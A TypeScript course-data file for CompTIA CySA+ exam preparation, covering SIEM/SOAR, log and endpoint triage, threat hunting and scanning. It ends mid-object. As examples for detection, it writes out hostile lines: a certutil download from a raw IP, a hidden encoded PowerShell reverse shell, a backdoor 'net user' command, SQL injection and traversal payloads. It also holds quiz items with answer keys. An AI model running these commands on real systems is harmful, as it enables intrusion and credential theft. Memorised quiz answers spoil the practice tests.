/* ===================================================================
   ANOXPASS — End-to-End Certification Course: CompTIA CySA+ (CS0-003)
   Blue-Team Security Operations, Vulnerability Mgmt, IR & Reporting
   Grounded in my_documents/Chapple M. CompTIA CySA+ Practice Tests.
   Exam CS0-003 3ed 2023.pdf & cybersecurity-incident-management-guide-EN.pdf.
   =================================================================== */

import type { CertificationCourse } from '../../types/course';

export const CYSA_COURSE: CertificationCourse = {
  certId: 'comptia-cysa-plus',
  certCode: 'CYSA+',
  title: 'CompTIA Cybersecurity Analyst (CySA+ CS0-003)',
  provider: 'CompTIA',
  tier: 3,
  tagline:
    'Master blue-team behavioral analytics, SIEM/EDR log triage, CVSS/EPSS vulnerability prioritization, incident response forensics, and executive reporting.',
  estimatedTotalHours: 75,
  passingScore: '750 / 900 (Scaled, max 85 questions + PBQs in 165 min)',
  domains: [
    // =================================================================
    // DOMAIN 1: Security Operations (33%)
    // =================================================================
    {
      id: 'cysa-d1',
      domainNumber: 1,
      title: 'Security Operations',
      examWeightPercent: 33,
      overview:
        'The highest-weighted CySA+ CS0-003 domain. Covers defensive architecture (Zero Trust, IAM, network/cloud hardening), SIEM/SOAR telemetry, hands-on indicator analysis (HTTP, DNS, packet captures, endpoint artifacts), threat intelligence frameworks, and hypothesis-driven threat hunting.',
      lessons: [
        {
          id: 'cysa-d1-l1',
          title: 'Defensive Architecture, SIEM Correlation & SOAR Orchestration',
          estimatedMinutes: 50,
          summary:
            'Understand how resilient network/cloud architectures generate high-fidelity telemetry, how SIEM correlation engines normalize and detect multi-stage attacks, and how SOAR automates containment safely.',
          learningObjectives: [
            'Analyze how Zero Trust, network segmentation, Jump Boxes, Proxy/WAF, and Cloud IAM reduce lateral movement and blast radius.',
            'Explain the SIEM ingestion pipeline: collection, parsing, normalization, enrichment, correlation, and alerting.',
            'Differentiate SIEM, EDR/XDR, NDR, and SOAR roles inside a modern Tier 2/3 SOC.',
            'Spot common logging blind spots (clock skew/NTP drift, unencrypted log transport, missing PowerShell ScriptBlock/Sysmon telemetry).',
          ],
          coreConcepts: [
            {
              heading: 'Defensive Architecture & Attack Surface Telemetry',
              explanation:
                'Analysts cannot detect what the architecture cannot observe. Effective blue-team architecture pairs preventive segmentation (VLANs, microsegmentation, DMZ/screened subnets, NAC/802.1X, Jump Hosts) with choke-point sensors: TLS-inspecting forward proxies for egress HTTP/S visibility, internal DNS resolvers logging every query (critical for catching C2 beaconing and DNS tunneling), EDR agents capturing process trees and memory injection, and CloudTrail/Azure Activity logs tracking API-plane abuse.',
              mentalModel:
                'Security architecture is airport design: narrow choke points (proxies, DNS, IdP) where every passenger’s passport and luggage must pass through cameras (SIEM/EDR) instead of open fields.',
              formulaOrRule:
                'Visibility Triad: Network Telemetry (NetFlow/PCAP/DNS/Proxy) + Endpoint Telemetry (EDR/Sysmon/OS Logs) + Identity/Cloud Telemetry (IdP/CloudTrail).',
            },
            {
              heading: 'SIEM Pipeline & Correlation Logic',
              explanation:
                'Raw logs arrive in incompatible formats (CEF, LEEF, JSON, Syslog, Windows Event XML). A SIEM runs five stages: (1) Collection via agents/syslog/APIs, (2) Parsing & Normalization into a unified schema (mapping src_ip, user, action across vendors), (3) Enrichment with Threat Intelligence (IoCs), GeoIP, and Asset Criticality, (4) Correlation using stateful rules or UEBA behavioral baselines (e.g., "Impossible Travel: login from Lagos and Frankfurt within 12 minutes"), and (5) Alerting with severity scoring and deduplication to prevent analyst fatigue.',
              mentalModel:
                'Think of a SIEM as an emergency room triage nurse translating reports from five different languages into one medical chart, cross-checking allergies (asset criticality), and ringing the trauma bell only when vitals combine dangerously.',
              formulaOrRule:
                'Critical Dependency: Synchronized NTP (Network Time Protocol) across ALL log sources—without synced timestamps, cross-system timeline correlation fails.',
            },
            {
              heading: 'SOAR Playbooks, Runbooks & Automation Safety',
              explanation:
                'SIEM detects and correlates; SOAR (Security Orchestration, Automation, and Response) connects disparate tools via APIs and webhooks to execute repeatable response workflows. A Playbook is a strategic, decision-tree response guide (often automated in SOAR); a Runbook is a step-by-step tactical operational procedure. Mature SOCs automate low-risk enrichment (VirusTotal lookup, GeoIP, AD group lookup) fully automatically, while keeping human-in-the-loop approval before destructive actions like isolating a domain controller or disabling a CEO’s account.',
              mentalModel:
                'Autopilot vs. Weapons Release: Let SOAR automatically gather telemetry, enrich IoCs, and block known-malicious C2 IPs, but require human confirmation before isolating Tier-0 infrastructure.',
            },
          ],
          realWorldScenario: {
            title: 'The Silent Credential Stuffing Wave',
            situation:
              'A SOC receives zero alerts during an overnight breach where an attacker steals 40,000 customer records via a cloud web portal. Post-incident review shows the WAF logged 85,000 HTTP 401 failures followed by 120 HTTP 200 successes from 18 residential proxy IPs, while the database logged mass SELECT queries—yet the SIEM never fired.',
            analysis:
              'Two architectural and SIEM design flaws caused the miss: (1) the WAF logs were parsed as raw text without normalizing HTTP status codes, breaking the SIEM correlation rule; and (2) the correlation rule only triggered on >100 failures from a SINGLE source IP, failing against a low-and-slow distributed spray across 18 IPs. Fixing normalization and switching to a user/endpoint-based correlation rule ("high 401-to-200 ratio across distinct IPs + anomalous egress volume") closes the blind spot.',
            takeaway:
              'Detection engineering fails silently when log parsing drifts or thresholds assume single-IP noisy attacks. Always verify normalization and correlate across identity and behavior, not just single source IPs.',
          },
          examTraps: [
            'Trap: Confusing SIEM and SOAR. SIEM aggregates, normalizes, and correlates logs to generate alerts; SOAR orchestrates multi-tool API actions and automated response playbooks.',
            'Trap: Ignoring NTP (time synchronization) on exam questions about confusing or out-of-order SIEM timelines. Unsynced clocks break log correlation and forensic admissibility.',
            'Trap: Over-automating SOAR containment on critical servers without human validation, allowing attackers to trigger self-inflicted DoS by spoofing alerts against domain controllers.',
          ],
          keyTerms: [
            {
              term: 'Log Normalization',
              definition:
                'Transforming heterogeneous log formats from diverse vendors into a standardized field schema so correlation rules work consistently.',
            },
            {
              term: 'UEBA (User and Entity Behavior Analytics)',
              definition:
                'Machine-learning baselining of normal user, host, and service behavior to detect subtle anomalies like credential misuse or insider exfiltration.',
            },
            {
              term: 'SOAR',
              definition:
                'Security Orchestration, Automation, and Response platform integrating security tools via APIs to automate enrichment and playbook execution.',
            },
            {
              term: 'Sysmon (System Monitor)',
              definition:
                'Windows system service recording granular process creation (Event ID 1), network connections (ID 3), registry edits, and DLL/memory injection for EDR/SIEM.',
            },
            {
              term: 'Log Enrichment',
              definition:
                'Appending external context (asset criticality, user department, GeoIP, threat intel feeds) to raw events to improve triage precision.',
            },
          ],
          conceptChecks: [
            {
              id: 'cysa-d1-l1-q1',
              question:
                'A Tier 2 analyst investigating an intrusion notices firewall egress logs show C2 callbacks occurring 4 minutes BEFORE the Windows endpoint logged the malicious PowerShell execution. What is the MOST likely technical cause?',
              options: [
                'The attacker decrypted TLS 1.3 traffic in transit',
                'NTP clock skew between the firewall and the Windows workstation',
                'The SIEM dropped Syslog UDP packets due to buffer overflow',
                'DNS over HTTPS (DoH) reversed the packet sequence numbers',
              ],
              correctIndex: 1,
              rationale:
                'Out-of-order cross-device timestamps (effect logged minutes before cause) are the classic symptom of missing or misconfigured NTP time synchronization across enterprise assets.',
            },
            {
              id: 'cysa-d1-l1-q2',
              question:
                'A SOC manager wants to reduce analyst burnout by automatically querying threat intelligence APIs, pulling Active Directory owner metadata, and opening enriched Jira tickets whenever a high-severity phishing alert fires. Which technology BEST meets this goal?',
              options: [
                'Network Access Control (802.1X)',
                'Web Application Firewall (WAF)',
                'SOAR (Security Orchestration, Automation, and Response)',
                'Data Loss Prevention (DLP) endpoint agent',
              ],
              correctIndex: 2,
              rationale:
                'SOAR specializes in cross-tool API orchestration, automated alert enrichment, and automated ticket/playbook execution.',
            },
          ],
          practicalDrill: {
            title: 'Design a High-Fidelity SIEM Correlation Rule & SOAR Enrichment Flow',
            prompt:
              'Build a detection rule and safe SOAR workflow to catch password spraying followed by mailbox exfiltration in Microsoft 365 / Entra ID.',
            steps: [
              'Identify the required log sources (IdP sign-in logs, Exchange/Audit logs, proxy logs) and confirm NTP sync.',
              'Write pseudo-logic for the correlation rule: e.g., >=15 failed logins across distinct accounts from 1 ASN/IP within 10 minutes followed by 1 successful login + Inbox Forwarding Rule creation.',
              'Specify 3 automated SOAR enrichment actions (GeoIP, Threat Intel score, user privilege check).',
              'Specify which containment step runs automatically (revoke refresh token) vs. requires analyst approval (disable VIP account).',
            ],
            successCriteria:
              'Rule correlates multi-stage behavior rather than a naive brute-force threshold, and SOAR workflow enforces human safety gates for high-impact accounts.',
          },
          flashcards: [
            {
              front: 'What are the 5 stages of the SIEM data pipeline?',
              back: 'Collection -> Parsing & Normalization -> Enrichment -> Correlation -> Alerting.',
              tag: 'CYSA-D1',
            },
            {
              front: 'Why is NTP synchronization essential for both SIEM correlation and digital forensics?',
              back: 'Without synchronized timestamps across hosts, firewalls, and cloud logs, reconstructing accurate attack sequences and defending forensic timelines fails.',
              tag: 'CYSA-D1',
            },
            {
              front: 'Distinguish a Playbook from a Runbook in SOC operations.',
              back: 'A Playbook is a broader scenario-based decision framework (often orchestrated in SOAR); a Runbook is a granular step-by-step technical procedure for a specific task.',
              tag: 'CYSA-D1',
            },
          ],
          sourceRefs: [
            'my_documents/Chapple M. CompTIA CySA+ Practice Tests. Exam CS0-003 3ed 2023.pdf',
          ],
        },
        {
          id: 'cysa-d1-l2',
          title: 'Malicious Activity Detection: Log, Network, DNS & Endpoint Telemetry',
          estimatedMinutes: 55,
          summary:
            'Develop hands-on exam fluency decoding real indicators of compromise (IoCs) across HTTP access logs, firewall/NetFlow logs, DNS tunneling patterns, Nmap scans, Windows/Linux process trees, and obfuscated PowerShell/Bash.',
          learningObjectives: [
            'Identify SQLi, XSS, Directory Traversal, Command Injection, and Web Shell payloads inside raw Apache/Nginx HTTP access logs.',
            'Recognize C2 beaconing, DNS tunneling (high-entropy subdomains/TXT queries), and data exfiltration patterns in network/PCAP telemetry.',
            'Detect Living-off-the-Land Binaries (LOLBins), suspicious parent-child process chains, persistence mechanisms, and Base64-encoded commands on Windows and Linux.',
            'Interpret Nmap scan outputs, tcpdump/Wireshark filters, and HTTP response codes (200 vs 302 vs 401/403 vs 500) to confirm whether an attack succeeded.',
          ],
          coreConcepts: [
            {
              heading: 'Decoding Web Server & Attack Logs (Did It Succeed?)',
              explanation:
                'CySA+ heavily tests reading raw Apache/IIS/Nginx logs and distinguishing an ATTEMPT from a COMPROMISE. Look at four fields together: (1) HTTP Method (GET vs. POST), (2) URL/Query Payload (e.g., `../../etc/passwd` = directory traversal; `\' OR 1=1--` or `UNION SELECT` = SQL injection; `<script>alert` = XSS; `; whoami` or `| cat` = OS command injection), (3) Status Code (403/404 = blocked/not found; 500 = backend error suggesting potential SQLi/crash; 200 = executed/returned data!), and (4) Response Byte Size (a sudden huge 200 response—e.g., 480,000 bytes on a login page—proves successful data extraction).',
              mentalModel:
                'Four-part log triage formula: WHO (Source IP) -> TRIED WHAT (Method + Payload) -> DID IT WORK? (Status Code + Response Bytes).',
              formulaOrRule:
                '200 OK + unusually large byte size after SQLi/Traversal payload = Likely Confirmed Compromise; 403/404 = Blocked/Failed Attempt.',
            },
            {
              heading: 'Network Indicators: C2 Beaconing, DNS Tunneling & Nmap Fingerprints',
              explanation:
                'Malware communicating with Command-and-Control (C2) servers leaves rhythmic statistical footprints: regular fixed-interval outbound connections (beaconing, e.g., every 60 seconds with tiny jitter) to newly registered domains or raw IPs on non-standard ports. DNS Tunneling hides C2 or stolen data inside DNS queries—spot it by unusually long, high-entropy hex/Base32 subdomains (`a9f4b2c1e88472.evil.tld`), elevated NXDOMAIN rates, or massive TXT/NULL record volumes. In reconnaissance logs, a SYN scan (`nmap -sS`) sends SYN -> receives SYN-ACK -> sends RST (half-open); a Connect scan (`-sT`) completes the 3-way handshake; a UDP scan (`-sU`) triggers ICMP Type 3 Code 3 (Port Unreachable) on closed ports.',
              mentalModel:
                'Normal human browsing is bursty and irregular; C2 beaconing ticks like a metronome. Normal DNS queries look like words; DNS tunneling looks like encrypted serial numbers stuffed into subdomains.',
              formulaOrRule:
                'DNS Tunneling Signature = Long high-entropy subdomains + High query frequency to 1 apex domain + Large TXT/NULL responses.',
            },
            {
              heading: 'Endpoint Forensics: Process Trees, LOLBins & Persistence',
              explanation:
                'Modern attackers avoid dropping noisy custom malware by abusing legitimate OS binaries—Living off the Land Binaries (LOLBins)—such as `powershell.exe -enc <Base64>`, `certutil.exe -urlcache -split -f` (file download), `mshta.exe`, `rundll32.exe`, `regsvr32.exe`, `wmic.exe`, and `bitsadmin` on Windows, or `curl|bash`, `nc -e`, and cron on Linux. The single fastest endpoint detection heuristic is anomalous Parent-Child Process relationships: `WINWORD.EXE` or `EXCEL.EXE` spawning `cmd.exe` or `powershell.exe`, or `w3wp.exe` (IIS web worker) spawning `whoami.exe` / `net.exe` (classic web shell execution!). Check persistence in Windows Run keys (`HKCU/HKLM\\...\\Run`), Scheduled Tasks, WMI Event Subscriptions, and Linux `/etc/crontab`, `~/.ssh/authorized_keys`, or systemd services.',
              mentalModel:
                'Parent-child sanity check: A web server (`w3wp.exe` / `apache2`) or Word document (`winword.exe`) has ZERO business spawning a command shell (`cmd.exe`/`powershell.exe`/`/bin/sh`).',
              formulaOrRule:
                'High-Confidence Compromise Chain: Office/Browser/WebServer -> cmd.exe/powershell.exe -enc -> certutil/curl download -> Scheduled Task/Run Key persistence.',
            },
          ],
          realWorldScenario: {
            title: 'Spotting a Web Shell Inside IIS & EDR Telemetry',
            situation:
              'An analyst reviews two linked logs: (1) IIS access log shows `POST /uploads/img_cache.aspx?cmd=whoami 200 1842` from external IP `185.220.101.4`; (2) EDR shows `w3wp.exe` (PID 4112) spawning `cmd.exe` (PID 6804) -> `powershell.exe -nop -w hidden -enc JABjAGwAaQBlAG4AdAA...` connecting outbound on TCP/443 to `91.214.124.77`.',
            analysis:
              'Every indicator screams confirmed active intrusion: an attacker uploaded an `.aspx` web shell to a writable `/uploads/` folder, executed OS commands through the IIS worker process (`w3wp.exe -> cmd.exe`), and launched a hidden, Base64-encoded PowerShell reverse shell over port 443 to blend into HTTPS traffic. Containment requires isolating the host immediately (preserving RAM for volatile forensics), blocking `91.214.124.77` at the perimeter, removing execution permissions on `/uploads/`, and auditing lateral movement from the IIS service account.',
            takeaway:
              'Never stop at blocking the external IP—the web shell file and any persistence/stolen service credentials remain inside the server until eradicated.',
          },
          examTraps: [
            'Trap: Seeing `%2e%2e%2f` or `..%2f` in an HTTP log and failing to recognize URL-encoded directory traversal (`../`). Always mentally decode `%20` (space), `%27` (`\'`), `%2e` (`.`), `%2f` (`/`), `%3c/%3e` (`<`/`>`).',
            'Trap: Assuming `certutil.exe` is harmless because it is a Microsoft-signed binary. Attackers routinely abuse `certutil -urlcache -f` as a LOLBin to download malware and bypass simple allowlists.',
            'Trap: Calling a `404` or `403` SQL injection log line a "confirmed data breach." Always check HTTP status code (200) AND response byte length before escalating as confirmed exfiltration.',
          ],
          keyTerms: [
            {
              term: 'LOLBins (Living off the Land Binaries)',
              definition:
                'Legitimate, pre-installed OS utilities (PowerShell, certutil, wmic, mshta, curl) abused by attackers to evade signature-based antivirus.',
            },
            {
              term: 'C2 Beaconing',
              definition:
                'Periodic, rhythmic outbound callbacks from compromised hosts to an attacker’s Command-and-Control server to fetch tasking.',
            },
            {
              term: 'DNS Tunneling',
              definition:
                'Encoding C2 commands or exfiltrated data inside DNS subdomain labels and TXT responses to bypass firewalls that permit port 53.',
            },
            {
              term: 'Web Shell',
              definition:
                'Malicious script (ASPX, PHP, JSP) uploaded to a web server giving remote command execution via HTTP requests.',
            },
            {
              term: 'Email Header Spoofing Check (SPF/DKIM/DMARC)',
              definition:
                'Authentication triad verifying sender IP authorization (SPF), cryptographic message integrity (DKIM), and policy action on failure (DMARC).',
            },
          ],
          conceptChecks: [
            {
              id: 'cysa-d1-l2-q1',
              question:
                'An analyst inspects an Nginx log line: `198.51.100.22 - - "GET /download?file=%2e%2e%2f%2e%2e%2fetc%2fpasswd HTTP/1.1" 200 2418`. What attack occurred and what was the outcome?',
              options: [
                'Reflected XSS attack that was blocked by the WAF',
                'Directory/Path Traversal attack that succeeded and returned file contents',
                'SQL Injection attack that failed with a server crash',
                'DNS Amplification attack targeting port 80',
              ],
              correctIndex: 1,
              rationale:
                '`%2e%2e%2f` URL-decodes to `../`, so the payload requests `../../etc/passwd` (Directory Traversal). The HTTP 200 status and 2,418-byte response confirm the server returned the file.',
            },
            {
              id: 'cysa-d1-l2-q2',
              question:
                'An EDR sensor alerts on a finance workstation where `EXCEL.EXE` spawned `powershell.exe -w hidden -nop -enc SQBFAFgA...`, followed 3 seconds later by `certutil.exe -urlcache -split -f http://45.133.1.9/update.bin`. What stage of the attack is occurring?',
              options: [
                'Passive OSINT reconnaissance',
                'Macro-triggered LOLBin execution and second-stage malware download',
                'Authorized Windows Update certificate renewal',
                'ARP cache poisoning on the local VLAN',
              ],
              correctIndex: 1,
              rationale:
                'Excel spawning hidden Base64 PowerShell and abusing `certutil -urlcache` to pull an executable from a raw IP is classic phishing-macro LOLBin execution and payload staging.',
            },
            {
              id: 'cysa-d1-l2-q3',
              question:
                'Firewall logs reveal a single internal workstation sending 4,200 DNS TXT queries per hour to unique 54-character hexadecimal subdomains under `cdn-metrics-sync.xyz`. What is the MOST likely malicious activity?',
              options: [
                'SQL Injection against an internal database',
                'DNS Tunneling for C2 communications or data exfiltration',
                'SYN Flood denial-of-service attack',
                'Kerberoasting against Active Directory',
              ],
              correctIndex: 1,
              rationale:
                'High-frequency DNS TXT queries with long, high-entropy hex subdomains to a single suspicious domain are the textbook signature of DNS tunneling.',
            },
          ],
          practicalDrill: {
            title: 'Multi-Log Intrusion Triage Challenge',
            prompt:
              'Practice rapidly decoding four common CySA+ log artifacts and determining attack type + containment action.',
            steps: [
              'Decode `%27%20UNION%20SELECT%20username,password%20FROM%20users--` and state the exact vulnerability and code-level fix (parameterized queries).',
              'Examine a suspicious SPF=FAIL, DKIM=FAIL, DMARC=NONE email header and explain why the spoofed invoice reached the user inbox.',
              'Identify which Wireshark display filter isolates outbound HTTP POST traffic to a suspect C2 IP (`ip.dst == 91.214.124.77 && http.request.method == "POST"`).',
              'Write the immediate host containment + credential rotation steps if `w3wp.exe` spawns `net user admin2 P@ss /add`.',
            ],
            successCriteria:
              'Correctly identifies every attack vector, explains why DMARC=NONE permitted delivery, and prescribes precise technical remediation.',
          },
          flashcards: [
            {
              front: 'What does `certutil.exe -urlcache -split -f <url>` indicate when seen in EDR logs?',
              back: 'Abuse of a Windows LOLBin (CertUtil) by an attacker to download malicious payloads from an external server.',
              tag: 'CYSA-D1',
            },
            {
              front: 'In HTTP logs, what URL-encoded sequence represents directory traversal (`../`)?',
              back: '`%2e%2e%2f` (or `%2e%2e%5c` for `..\\`).',
              tag: 'CYSA-D1',
            },
            {
              front: 'Why is `w3wp.exe` or `apache2` spawning `cmd.exe` / `whoami` a critical alert?',
              back: 'It strongly indicates Remote Code Execution (RCE) or an active Web Shell running inside the web application process.',
              tag: 'CYSA-D1',
            },
          ],
          sourceRefs: [
            'my_documents/Chapple M. CompTIA CySA+ Practice Tests. Exam CS0-003 3ed 2023.pdf',
          ],
        },
        {
          id: 'cysa-d1-l3',
          title: 'Threat Intelligence, MITRE ATT&CK & Hypothesis-Driven Threat Hunting',
          estimatedMinutes: 45,
          summary:
            'Operationalize the Threat Intelligence Lifecycle, STIX/TAXII sharing, Diamond Model, Cyber Kill Chain, and MITRE ATT&CK TTPs to conduct proactive, hypothesis-driven threat hunts.',
          learningObjectives: [
            'Distinguish Strategic, Tactical, Operational, and Technical threat intelligence and match each to its audience.',
            'Apply the Pyramid of Pain to prioritize behavioral TTP detections (MITRE ATT&CK) over brittle hash/IP indicators.',
            'Map adversary intrusions using the Diamond Model (Adversary, Infrastructure, Capability, Victim) and Cyber Kill Chain.',
            'Execute the 4-step Hypothesis-Driven Threat Hunting loop and feed findings back into automated SIEM detections.',
          ],
          coreConcepts: [
            {
              heading: 'Threat Intelligence Lifecycle, Types & STIX/TAXII',
              explanation:
                'Raw IoC lists are NOT intelligence until analyzed and actionable. The Threat Intelligence Lifecycle runs six stages: Direction (requirements) -> Collection -> Processing -> Analysis -> Dissemination -> Feedback. Intelligence splits into four tiers: Strategic (high-level trends for executives/Board), Operational (campaigns, actor intent, timing for IR/SOC leads), Tactical (TTPs—how actors attack—for defenders/architects), and Technical (atomic IoCs like hashes, IPs, domains for SIEM/firewall feeds). Automated sharing uses STIX (Structured Threat Information Expression—the JSON data format) transported over TAXII (Trusted Automated Exchange of Intelligence Information—the HTTPS delivery protocol), governed by Traffic Light Protocol (TLP:RED, AMBER+STRICT, AMBER, GREEN, CLEAR).',
              mentalModel:
                'STIX is the envelope’s structured letter; TAXII is the postal truck delivering it. TLP is the confidentiality stamp on the envelope.',
              formulaOrRule:
                'TLP Rules: RED = named recipients only; AMBER = organization + need-to-know clients; AMBER+STRICT = organization only; GREEN = community (not public); CLEAR = unrestricted.',
            },
            {
              heading: 'Pyramid of Pain, MITRE ATT&CK & the Diamond Model',
              explanation:
                'David Bianco’s Pyramid of Pain ranks how hard it is for adversaries to change indicators when defenders block them (bottom to top): Hash Values (Trivial) -> IP Addresses (Easy) -> Domain Names (Simple) -> Network/Host Artifacts (Annoying) -> Tools (Challenging) -> TTPs (Tough!). MITRE ATT&CK catalogs real-world adversary Tactics (the "why," e.g., Credential Access, Lateral Movement) and Techniques (the "how," e.g., T1003 OS Credential Dumping). The Diamond Model pivots investigations across four vertices—Adversary, Infrastructure, Capability, Victim—so discovering one malicious IP (Infrastructure) leads you to the malware family (Capability), targeted sector (Victim), and threat group (Adversary).',
              mentalModel:
                'Blocking hashes is swatting individual mosquitoes; detecting MITRE ATT&CK TTPs is draining the swamp so the entire swarm cannot breed.',
              formulaOrRule:
                'Pyramid of Pain (Low -> High Impact): Hashes -> IPs -> Domains -> Artifacts -> Tools -> TTPs (MITRE ATT&CK).',
            },
            {
              heading: 'Hypothesis-Driven Threat Hunting',
              explanation:
                'Threat hunting assumes breach ("the adversary is already inside evading signature alerts"). A professional hunt NEVER starts with random log scrolling—it starts with a specific, testable Hypothesis derived from threat intelligence, MITRE ATT&CK, or crown-jewel asset analysis (e.g., "APT group X targeting our industry uses Scheduled Tasks + LSASS memory access via rundll32; let’s hunt EDR telemetry for non-system processes accessing lsass.exe"). The loop runs: (1) Establish Hypothesis -> (2) Investigate via Tools/Queries (KQL/SPL) -> (3) Uncover New Patterns/TTPs -> (4) Inform & Enrich Automated Detections (convert successful manual hunt queries into permanent SIEM alerts!).',
              mentalModel:
                'A scientist in a lab: Form hypothesis -> run targeted experiment on telemetry -> validate/refute -> automate the discovery so humans never have to hunt that exact pattern manually again.',
            },
          ],
          realWorldScenario: {
            title: 'Hunting Scattered-Spider Style Identity Abuse',
            situation:
              'An ISAC shares a TLP:AMBER advisory warning that a financially motivated group is targeting retail help desks via vishing to reset MFA and register rogue FIDO/authenticator devices, then pivoting via legitimate RMM tools (AnyDesk/ScreenConnect). No malware hashes are included.',
            analysis:
              'Because the adversary uses legitimate RMM tools and social engineering, hash/IP feeds are useless. The Threat Hunter maps the advisory to MITRE ATT&CK (T1556/T1098 Account Manipulation + T1219 Remote Access Software) and forms a hypothesis: "If this actor is inside our tenant, we will see new MFA device enrollments shortly after help-desk resets, or unauthorized RMM binaries executing on finance endpoints." Querying Entra ID audit logs + EDR process lists uncovers an unapproved ScreenConnect binary on a payroll laptop—stopping ransomware days before encryption—and converts the query into a permanent SIEM rule.',
            takeaway:
              'Top-tier CySA+ analysts translate TTP advisories into proactive hunts and permanently operationalize hunt findings into automated detections.',
          },
          examTraps: [
            'Trap: Confusing STIX and TAXII. STIX = structured language/format; TAXII = transport mechanism/protocol.',
            'Trap: Starting a threat hunt by "randomly reviewing firewall logs" or "waiting for a SIEM alert." Hunts are proactive and ALWAYS begin with a hypothesis.',
            'Trap: Sharing TLP:AMBER+STRICT intelligence with external partners or posting TLP:GREEN data on public social media. TLP:AMBER+STRICT is strictly internal to your organization; TLP:GREEN is community-only (no public channels).',
          ],
          keyTerms: [
            {
              term: 'MITRE ATT&CK',
              definition:
                'Globally accessible adversarial knowledge base of real-world Tactics (goals), Techniques (methods), and Procedures (specific implementations).',
            },
            {
              term: 'Diamond Model of Intrusion Analysis',
              definition:
                'Analytical framework connecting four core intrusion features: Adversary, Infrastructure, Capability, and Victim.',
            },
            {
              term: 'STIX / TAXII',
              definition:
                'OASIS standards where STIX defines structured threat intelligence representation and TAXII defines the transport protocol to exchange it.',
            },
            {
              term: 'Traffic Light Protocol (TLP 2.0)',
              definition:
                'Information-sharing sensitivity taxonomy (RED, AMBER+STRICT, AMBER, GREEN, CLEAR) controlling how threat intelligence may be redistributed.',
            },
            {
              term: 'Pyramid of Pain',
              definition:
                'Model ranking indicator classes from easiest (hashes/IPs) to hardest (TTPs) for attackers to modify when disrupted.',
            },
          ],
          conceptChecks: [
            {
              id: 'cysa-d1-l3-q1',
              question:
                'An analyst receives a threat advisory marked TLP:AMBER+STRICT from a sector ISAC detailing an active zero-day exploitation campaign. Who is permitted to receive this intelligence?',
              options: [
                'Anyone on public security forums to maximize industry defense',
                'Only personnel within the recipient’s own organization who need to know to act on it',
                'The recipient’s organization plus external managed clients and suppliers',
                'Only the single individual whose email received the message',
              ],
              correctIndex: 1,
              rationale:
                'Under TLP 2.0, TLP:AMBER+STRICT restricts disclosure strictly to the recipient’s own organization (unlike plain TLP:AMBER, which also permits sharing with clients/customers who need to protect themselves, and TLP:RED, which restricts to named direct recipients only).',
            },
            {
              id: 'cysa-d1-l3-q2',
              question:
                'According to the Pyramid of Pain, which detection improvement imposes the HIGHEST operational cost on a persistent adversary?',
              options: [
                'Adding 500 SHA-256 malware file hashes to an EDR blocklist',
                'Blocking 40 known Tor exit node IP addresses at the perimeter firewall',
                'Building behavioral detections targeting the adversary’s MITRE ATT&CK credential-dumping and lateral-movement TTPs',
                'Sinkholing three newly registered phishing domains',
              ],
              correctIndex: 2,
              rationale:
                'TTPs sit at the apex of the Pyramid of Pain. Recompiling a file hash or swapping IPs/domains takes attackers seconds, whereas abandoning core TTPs forces them to re-engineer their entire playbook.',
            },
          ],
          practicalDrill: {
            title: 'Write a MITRE ATT&CK Threat Hunt Hypothesis & Pivot Plan',
            prompt:
              'Convert an intelligence report about Kerberoasting (MITRE ATT&CK T1558.003) into an executable threat hunt.',
            steps: [
              'State a crisp, testable Hunt Hypothesis referencing Windows Event ID 4769 (Kerberos TGS requests with RC4 encryption 0x17).',
              'Map the scenario across all four Diamond Model vertices (Adversary, Capability, Infrastructure, Victim).',
              'List two telemetry filters that eliminate false positives (e.g., excluding machine accounts ending in `$` and known legacy service accounts).',
              'Describe how you will convert a validated hunt query into a continuous SIEM detection rule.',
            ],
            successCriteria:
              'Hypothesis is specific, telemetry-grounded, accounts for false positives, and closes the loop into automated detection.',
          },
          flashcards: [
            {
              front: 'What are the 4 vertices of the Diamond Model of Intrusion Analysis?',
              back: 'Adversary, Infrastructure, Capability, and Victim.',
              tag: 'CYSA-D1',
            },
            {
              front: 'How do STIX and TAXII work together?',
              back: 'STIX is the structured data format describing cyber threat intelligence; TAXII is the application-layer protocol used to transmit STIX over HTTPS.',
              tag: 'CYSA-D1',
            },
            {
              front: 'What MUST be the first step of any proactive threat hunt?',
              back: 'Formulating a clear, testable Hypothesis based on threat intelligence, MITRE ATT&CK TTPs, or environmental anomaly insights.',
              tag: 'CYSA-D1',
            },
          ],
          sourceRefs: [
            'my_documents/Chapple M. CompTIA CySA+ Practice Tests. Exam CS0-003 3ed 2023.pdf',
          ],
        },
      ],
    },

    // =================================================================
    // DOMAIN 2: Vulnerability Management (30%)
    // =================================================================
    {
      id: 'cysa-d2',
      domainNumber: 2,
      title: 'Vulnerability Management',
      examWeightPercent: 30,
      overview:
        'Master the complete vulnerability lifecycle: credentialed vs. non-credentialed scanning, cloud CSPM/container scanning, decoding CVSS v3.1 vector strings, integrating EPSS and CISA KEV for risk-based prioritization, and eliminating OWASP/SDLC flaws.',
      lessons: [
        {
          id: 'cysa-d2-l1',
          title: 'Vulnerability Scanning, Asset Discovery & Cloud CSPM Assessments',
          estimatedMinutes: 45,
          summary:
            'Configure accurate vulnerability scans—balancing credentialed vs. non-credentialed, active vs. passive, agent vs. network—while managing OT/ICS sensitivity, cloud posture (CSPM), and false-positive validation.',
          learningObjectives: [
            'Contrast credentialed, non-credentialed, agent-based, and passive vulnerability discovery methods and explain when each is mandatory.',
            'Avoid operational disruption when scanning fragile OT/ICS/SCADA or medical devices (using passive sensors instead of aggressive active probes).',
            'Evaluate cloud and container vulnerabilities via CSPM, IaC scanning, and container image registries.',
            'Validate scan results to distinguish True Positives, False Positives, True Negatives, and False Negatives.',
          ],
          coreConcepts: [
            {
              heading: 'Credentialed vs. Non-Credentialed & Agent vs. Passive Scanning',
              explanation:
                'Non-credentialed (unauthenticated) network scans view hosts from an external attacker’s perspective—useful for testing perimeter exposure, but blind to missing local OS patches, weak registry settings, and vulnerable third-party libraries. Credentialed (authenticated) scans log into hosts via SSH/WinRM with a dedicated read-only scan service account to inspect exact patch levels and configurations—dramatically lowering False Negatives and False Positives. Agent-based scanners run lightweight daemons on roaming laptops and ephemeral cloud instances that miss scheduled network scan windows. Passive scanners sniff SPAN/TAP network traffic silently to fingerprint fragile OT/ICS/SCADA devices that crash under active probes.',
              mentalModel:
                'Non-credentialed = checking if doors and windows are locked from the sidewalk; Credentialed = walking inside with a master inspection checklist; Passive = watching security camera footage of fragile museum artifacts without touching them.',
              formulaOrRule:
                'Fragile OT/ICS/Medical Devices -> ALWAYS use Passive Scanning / Asset Monitoring, NEVER aggressive active port/exploit scans.',
            },
            {
